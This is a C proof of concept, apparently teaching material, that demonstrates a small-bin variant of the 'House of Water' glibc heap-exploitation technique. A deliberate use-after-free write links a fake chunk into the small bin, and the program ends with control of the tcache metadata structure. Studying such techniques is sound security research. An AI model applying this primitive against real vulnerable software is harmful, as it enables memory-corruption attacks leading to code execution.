#include <stdio.h>
#include <stdlib.h>

/*
 * House of Water is a technique for converting a Use-After-Free (UAF) vulnerability
 * into a tcache metadata control primitive, with the additional benefit of obtaining
 * a free libc pointer from within the tcache metadata.
 *
 * This technique is a variant of the original House of Water. 
 * Instead of targeting unsorted bins, it targets small bins. 
 * This variant of the technique avoid relying on heap address leaks or brute‑forcing.
 *
 * There is no need to forge a size field inside the tcache structure, 
 * since the fake chunk is linked through a small bin.
 *
 * First, we craft fake `fd` and `bk` pointers above the 0x320 and 0x330 tcache‑linked chunks. 
 * We then build a fake linked list of three chunks in the 0x90 small bin,
 * such that the second byte of the middle chunk’s address matches the second byte of the tcache end pointer. 
 * This alignment allows us to avoid relying on partial heap leaks or brute‑forcing.
 *
 * Finally, we link the fake chunk by overwriting the least significant bytes of the
 * `fd` and `bk` pointers of the start and end chunks in the small bin with a single NULL byte, 
 * causing them to point to the fake chunk located above the 0x320 and 0x330 tcache bins.
 *
 * Original technique: @udp_ctf (Water Paddler / Blue Water). 
 * Small-bin variant: @4f3rg4n (CyberEGGs).
 */

int main(void) {
    void *_ = NULL;
    setbuf(stdin, NULL); 
    setbuf(stdout, NULL); 
    setbuf(stderr, NULL);

    printf("=== PHASE 1: Heap Layout ===\n");
    
    // Allocate 0x90 chunks + guards (prevents consolidation)
    // small_middle aligns with tcache metadata page & first nibble (no bruteforce needed)
    void *small_middle = malloc(0x88); 
    printf("[-] middle chunk: %p\n", small_middle);
    _ = malloc(0x18);
    
    void *small_start = malloc(0x88); 
    printf("[-] start chunk:  %p\n", small_start);
    _ = malloc(0x18);
    
    void *small_end = malloc(0x88); 
    printf("[-] end chunk:    %p\n", small_end);
    _ = malloc(0x18);

    printf("[+] Three 0x90 target chunks are ready\n\n");


    printf("=== PHASE 2: Tcache Exhaust ===\n");
    
    // Derive tcache metadata from middle chunk page
    void *tcache_base = (void *)((long)small_middle & ~0xfffUL);
    
    // Exhaust 0x90 tcache (next free will placed in unsorted bin)
    void *fill[7];
    for (int i = 0; i < 7; i++) fill[i] = malloc(0x88);
    for (int i = 0; i < 7; i++) free(fill[i]);
    printf("[+] tcache[0x90] exhausted -> unsorted bin next\n\n");


    printf("=== PHASE 3: Fake Tcache Entries ===\n");
    
    // Craft fake tcache entries at 0x320/0x330 point to chunk headers
    printf("[+] Crafting tcache[0x330] FWD -> small_start header:\n");
    *(long*)(small_start-0x18) = 0x331;
    free(small_start-0x10);
    *(long*)(small_start-0x8) = 0x91;
    
    printf("[+] Crafting tcache[0x320] BCK -> small_end header:\n");
    *(long*)(small_end-0x18) = 0x321;
    free(small_end-0x10);
    *(long*)(small_end-0x8) = 0x91;
    
    printf("[+] Fake entries ready @ tcache_base: %p\n\n", tcache_base);


    printf("=== PHASE 4: Small Bin Setup ===\n");
    
    // Sort into small bin: start <-> middle <-> end
    free(small_end);
    free(small_middle);
    free(small_start);
    _ = malloc(0x700);  // Triggers small bin sort
    
    printf("[+] smallbin[0x90]: %p <-> %p <-> %p\n", 
           small_start-0x10, small_middle-0x10, small_end-0x10);

    printf("[+] tcache[0x320/0x330] ready for linking\n\n");


    printf("=== PHASE 5: Linking fake chunk ===\n");
    
    /* VULNERABILITY: UAF overwrite */
    printf("[-] UAF: Linking fake chunk into smallbin...\n");
    *(char*)small_start = 0x00; // Clear LSB of FWD
    *(char*)(small_end+0x8) = 0x00; // Clear LSB of BCK
    /* VULNERABILITY */
    
    printf("[+] smallbin[0x90]: %p <-> %p(FAKE) <-> %p\n\n", 
           small_start, tcache_base+0x200, small_end);


    printf("=== PHASE 6: Tcache Control ===\n");
    
    // Drain tcache to force smallbin alloc, then get fake chunk!
    for (int i = 7; i > 0; i--) _ = malloc(0x88);
    _ = malloc(0x88);  // Pop start
    _ = malloc(0x88);  // Pop end

    void *tcache_chunk = malloc(0x88); 
    printf("tcache_perthread_struct controlled @ %p\n", tcache_chunk);
  
    return 0;
}
